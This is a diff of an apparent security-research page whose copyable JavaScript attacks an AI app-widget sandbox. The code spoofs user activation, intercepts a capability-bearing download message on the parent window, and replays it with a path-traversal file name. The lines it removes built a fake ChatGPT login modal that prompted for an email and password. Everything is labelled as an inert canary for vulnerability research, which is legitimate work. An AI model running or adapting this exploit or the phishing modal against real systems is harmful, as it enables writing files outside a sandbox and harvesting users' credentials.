@@ -1,29 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T46 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T46b clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T46 CLEAN COPY PAGE (download replay bypass) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T46b CLEAN COPY PAGE (download replay bypass, auto-run) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T46 - download message replay bypass (Pluto Security research canary)
-// Captures the real download message (capability + post-sanitize name) in transit
-// on the runner window, then replays it with a RAW PATH NAME - skipping the
-// widget-realm bootstrap wrapper entirely. Inert canaries only; disk is ground truth.
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T46b - download message replay bypass, no login screen (Pluto Security canary)
+// Auto-runs: captures the real download message (capability + post-sanitize
+// name) on the runner window, replays it with a RAW PATH NAME, skipping the
+// widget-side wrapper. Inert canaries only; disk is ground truth.
 (function () {
   var API = window.oai || window.openai || window.webplus;
+  var d = document;
+  var p = window.parent;
 
-  // 1) spoof activation (T11-proven path)
   try {
     Object.defineProperty(navigator, "userActivation", {
       get: function () { return { isActive: true, hasBeenActive: true }; },
       configurable: true
     });
   } catch (e) {}
-  try { if (API &amp;&amp; API.requestDisplayMode) { API.requestDisplayMode({ mode: "fullscreen" }); } } catch (e) {}
 
-  var d = document;
-  var p = window.parent;
-
-  // 2) capture every message with a capability in it, on the RUNNER window
   window.__t46 = { raw: null, data: null, origin: null, ports: 0, n: 0 };
   try {
     p.addEventListener("message", function (e) {
@@ -50,155 +46,68 @@
     }, false);
   } catch (e) {}
 
-  // 3) modal (login replica look)
   var ov = d.createElement("div");
   ov.id = "t46-ov";
   var css = d.createElement("style");
   css.textContent = [
-    "#t46-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.55);display:flex;align-items:center;justify-content:center;font-family:'Sohne',-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif}",
-    "#t46-modal{position:relative;width:560px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.07);border-radius:24px;padding:28px 28px 32px;box-shadow:0 24px 64px rgba(0,0,0,.5);text-align:center;color:#fff}",
-    "#t46-x{position:absolute;top:14px;right:16px;width:28px;height:28px;border:none;background:transparent;color:#fff;font-size:18px;line-height:28px;cursor:pointer;border-radius:999px}",
-    "#t46-x:hover{background:rgba(255,255,255,.1)}",
-    "#t46-modal h1{font-size:20px;font-weight:600;line-height:1.3;margin:0 0 8px;color:#fff}",
-    "#t46-modal p.sub{font-size:14px;color:#9b9b9b;line-height:1.5;margin:0 0 22px}",
-    "#t46-modal input{width:100%;box-sizing:border-box;height:48px;padding:0 16px;font-size:15px;border:1px solid rgba(255,255,255,.12);border-radius:12px;background:rgba(0,0,0,.35);color:#fff;outline:none;margin-bottom:16px}",
-    "#t46-modal input::placeholder{color:#8f8f8f}",
-    "#t46-modal input:focus{border-color:rgba(255,255,255,.4)}",
-    "#t46-modal button.t46-cta{width:100%;height:48px;background:#fff;color:#0d0d0d;border:none;border-radius:999px;font-size:15px;font-weight:600;cursor:pointer;margin:0}",
-    "#t46-modal button.t46-cta:hover{background:#ececec}",
-    "#t46-ch{border:2px solid #ff5252;border-radius:12px;padding:14px;text-align:left;font-family:Menlo,Consolas,monospace;font-size:11.5px;background:rgba(0,0,0,.35);color:#ff8a8a;line-height:1.6}",
-    "#t46-ch b{font-size:13px;color:#ff5252}",
-    "#t46-ch pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}",
-    "#t46-corner{position:fixed;right:8px;bottom:8px;z-index:2147483647;font-family:Menlo,monospace;font-size:10px;color:#ff5252;background:rgba(0,0,0,.75);padding:2px 6px;border:1px solid #ff5252;border-radius:4px}",
-    "#t46-corner button{margin-left:6px;cursor:pointer;font-size:10px;font-family:inherit;color:#ff5252;background:transparent;border:none}"
+    "#t46-ov{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647;width:560px;max-width:calc(100vw - 48px);max-height:calc(100vh - 48px);overflow:auto;box-sizing:border-box;background:#212121;border:2px solid #ff5252;border-radius:12px;padding:20px;font-family:Menlo,Consolas,monospace;font-size:12px;color:#ff8a8a;line-height:1.6}",
+    "#t46-ov b{color:#ff5252;font-size:13px}",
+    "#t46-ov pre{white-space:pre-wrap;word-break:break-all;color:#ffc9c9;margin:6px 0}"
   ].join("");
   ov.appendChild(css);
 
-  var modal = d.createElement("div");
-  modal.id = "t46-modal";
-  ov.appendChild(modal);
-
-  function el(html) {
-    var t = d.createElement("div");
-    t.innerHTML = html;
-    return t.firstElementChild;
-  }
-
-  function xBtn() {
-    var x = d.createElement("button");
-    x.id = "t46-x"; x.type = "button"; x.textContent = "\u2715";
-    x.onclick = function () { ov.remove(); corner.remove(); };
-    return x;
-  }
-
-  function renderEmailStep() {
-    modal.innerHTML = "";
-    modal.appendChild(xBtn());
-    modal.appendChild(el("&lt;h1&gt;Log in or sign up&lt;/h1&gt;"));
-    modal.appendChild(el('&lt;p class="sub"&gt;You\u2019ll get smarter responses and can upload files, images, and more.&lt;/p&gt;'));
-    var em = d.createElement("input");
-    em.type = "email"; em.placeholder = "Email address"; em.autocomplete = "username";
-    modal.appendChild(em);
-    var go = d.createElement("button");
-    go.className = "t46-cta"; go.type = "button"; go.textContent = "Continue";
-    go.onclick = function () { if (em.value.trim()) renderPwStep(em.value.trim()); };
-    modal.appendChild(go);
-    em.focus();
-  }
-
-  function renderPwStep(email) {
-    modal.innerHTML = "";
-    modal.appendChild(xBtn());
-    modal.appendChild(el("&lt;h1&gt;Enter your password&lt;/h1&gt;"));
-    modal.appendChild(el('&lt;p class="sub"&gt;Welcome back! Enter your password to continue to ChatGPT.&lt;/p&gt;'));
-    var pw = d.createElement("input");
-    pw.type = "password"; pw.placeholder = "Password"; pw.autocomplete = "current-password";
-    modal.appendChild(pw);
-    var go = d.createElement("button");
-    go.className = "t46-cta"; go.type = "button"; go.textContent = "Continue";
-    go.onclick = function () { if (pw.value) renderCapture(email, pw.value); };
-    modal.appendChild(go);
-    pw.focus();
-  }
-
-  function esc(s) { return String(s).replace(/&amp;/g, "&amp;amp;").replace(/&lt;/g, "&amp;lt;").replace(/&gt;/g, "&amp;gt;"); }
+  ov.innerHTML =
+    "&lt;b&gt;T46 RESEARCH CANARY \u2014 Pluto Security (inert demo)&lt;/b&gt;&lt;br&gt;" +
+    '&lt;div id="t46-s1"&gt;1 anchor download (name T46/../../../canary.txt): firing...&lt;/div&gt;' +
+    '&lt;div id="t46-s2"&gt;2 captured envelope: waiting...&lt;/div&gt;' +
+    '&lt;div id="t46-s3"&gt;3 replay with raw name ../T46b-raw.txt: waiting...&lt;/div&gt;' +
+    '&lt;pre id="t46-pre"&gt;&lt;/pre&gt;';
+  d.body.appendChild(ov);
 
   function setS(id, t) { var e = d.getElementById(id); if (e) e.textContent = t; }
 
-  function renderCapture(email, pass) {
-    modal.innerHTML = "";
-    modal.appendChild(xBtn());
-    modal.appendChild(el("&lt;h1&gt;T46 \u2014 captured&lt;/h1&gt;"));
-    var cap = d.createElement("div");
-    cap.id = "t46-ch";
-    cap.innerHTML =
-      "&lt;b&gt;RESEARCH CANARY \u2014 nothing real, nothing stored&lt;/b&gt;&lt;br&gt;" +
-      "email: " + esc(JSON.stringify(email)) + " / password: " + esc(JSON.stringify(pass)) + "&lt;br&gt;&lt;br&gt;" +
-      '&lt;div id="t46-s1"&gt;1 anchor download (name T46/../../../canary.txt): firing...&lt;/div&gt;' +
-      '&lt;div id="t46-s2"&gt;2 captured envelope: waiting...&lt;/div&gt;' +
-      '&lt;div id="t46-s3"&gt;3 replay with raw name ../T46b-raw.txt: waiting...&lt;/div&gt;' +
-      '&lt;pre id="t46-pre"&gt;&lt;/pre&gt;';
-    modal.appendChild(cap);
+  try {
+    var blob = new Blob(["T46 research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
+    var a = d.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "T46/../../../canary.txt";
+    d.body.appendChild(a);
+    a.click();
+    a.remove();
+    setS("t46-s1", "1 anchor download fired (name T46/../../../canary.txt)");
+  } catch (e) { setS("t46-s1", "1 anchor download threw: " + e); }
 
-    // step 1: normal anchor download with a PATH-CARRYING canary name (T11-proven path)
-    try {
-      var blob = new Blob(["T46 research canary - Pluto Security - " + new Date().toISOString() + "\n"], { type: "text/plain" });
-      var a = d.createElement("a");
-      a.href = URL.createObjectURL(blob);
-      a.download = "T46/../../../canary.txt";
-      d.body.appendChild(a);
-      a.click();
-      a.remove();
-      setS("t46-s1", "1 anchor download fired (name T46/../../../canary.txt) - check capture");
-    } catch (e) { setS("t46-s1", "1 anchor download threw: " + e); }
-
-    // step 2: show captured envelope
-    setTimeout(function () {
-      var t = window.__t46;
-      if (t &amp;&amp; t.raw) {
-        setS("t46-s2", "2 captured envelope (" + t.n + " msg(s), origin=" + t.origin + ", ports=" + t.ports + "):");
-        var pre = d.getElementById("t46-pre");
-        if (pre) pre.textContent = t.raw.slice(0, 1500);
-
-        // step 3: replay with a raw path name, skipping the widget-side wrapper
-        setTimeout(function () {
-          try {
-            var env = structuredClone(t.data);
-            var name0 = null;
-            (function walk(o) {
-              if (!o || typeof o !== "object") return;
-              for (var k in o) {
-                var v = o[k];
-                if (typeof v === "string" &amp;&amp; (v.indexOf("canary") !== -1 || v.indexOf("T46") !== -1)) { name0 = v; o[k] = "../T46b-raw.txt"; }
-                else if (v &amp;&amp; typeof v === "object") walk(v);
-              }
-            })(env);
-            if (name0 === null) {
-              setS("t46-s3", "3 replay: no name field found in envelope (see pre) - NOT replayed");
-            } else {
-              p.postMessage(env, "*");
-              setS("t46-s3", "3 replayed: name '" + name0 + "' -&gt; '../T46b-raw.txt' posted to runner window. Disk is ground truth (tell the researcher).");
+  setTimeout(function () {
+    var t = window.__t46;
+    if (t &amp;&amp; t.raw) {
+      setS("t46-s2", "2 captured envelope (" + t.n + " msg(s), origin=" + t.origin + ", ports=" + t.ports + "):");
+      var pre = d.getElementById("t46-pre");
+      if (pre) pre.textContent = t.raw.slice(0, 1500);
+      setTimeout(function () {
+        try {
+          var env = structuredClone(t.data);
+          var name0 = null;
+          (function walk(o) {
+            if (!o || typeof o !== "object") return;
+            for (var k in o) {
+              var v = o[k];
+              if (typeof v === "string" &amp;&amp; (v.indexOf("canary") !== -1 || v.indexOf("T46") !== -1)) { name0 = v; o[k] = "../T46b-raw.txt"; }
+              else if (v &amp;&amp; typeof v === "object") walk(v);
             }
-          } catch (e) { setS("t46-s3", "3 replay threw: " + e); }
-        }, 1500);
-      } else {
-        setS("t46-s2", "2 captured envelope: NOTHING captured (interception path differs - report)");
-        setS("t46-s3", "3 replay: skipped (nothing captured)");
-      }
-    }, 1500);
-  }
-
-  var corner = d.createElement("div");
-  corner.id = "t46-corner";
-  corner.textContent = "RESEARCH CANARY \u2014 Pluto Security (inert demo)";
-  var closeBtn = d.createElement("button");
-  closeBtn.textContent = "[x] close";
-  closeBtn.onclick = function () { ov.remove(); corner.remove(); };
-  corner.appendChild(closeBtn);
-
-  d.body.appendChild(ov);
-  d.body.appendChild(corner);
-  renderEmailStep();
+          })(env);
+          if (name0 === null) {
+            setS("t46-s3", "3 replay: no name field found in envelope - NOT replayed (see envelope)");
+          } else {
+            p.postMessage(env, "*");
+            setS("t46-s3", "3 replayed: '" + name0 + "' -&gt; '../T46b-raw.txt' posted to runner window. Tell the researcher - disk is ground truth.");
+          }
+        } catch (e) { setS("t46-s3", "3 replay threw: " + e); }
+      }, 1500);
+    } else {
+      setS("t46-s2", "2 captured envelope: NOTHING captured (interception differs - report)");
+      setS("t46-s3", "3 replay: skipped");
+    }
+  }, 1500);
 })();
 </pre>
 <script>
